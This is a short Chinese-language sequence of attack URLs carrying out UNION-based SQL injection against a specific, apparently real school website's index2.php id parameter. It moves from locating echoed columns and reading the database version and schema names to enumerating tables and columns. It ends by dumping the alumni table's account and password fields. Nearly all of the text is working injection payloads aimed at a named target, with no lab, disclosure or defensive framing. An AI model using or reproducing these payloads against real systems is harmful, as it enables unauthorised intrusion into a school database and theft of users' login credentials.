获取回显位置
http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,2,3,4,5;#

获取数据库版本及库名：

http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,version(),group_concat(schema_name),4,5 from information_schema.schemata;#

获取对应库名中的表单：
http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=’cjps’;#

获取对应表的列名：
http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=’cjps’ and table_name=’class_name’;#
http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=’cjps’ and table_name=’alumni’;#
查看对应表：
http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,group_concat(id,’:’;class_name),3,4,5 from cjps.class_name;#
http://www2.cjps.ntpc.edu.tw/cjps/school_action/index2.php?id=0 union select 1,group_concat(account,’:’,password),3,4,5 from cjps.alumni;#
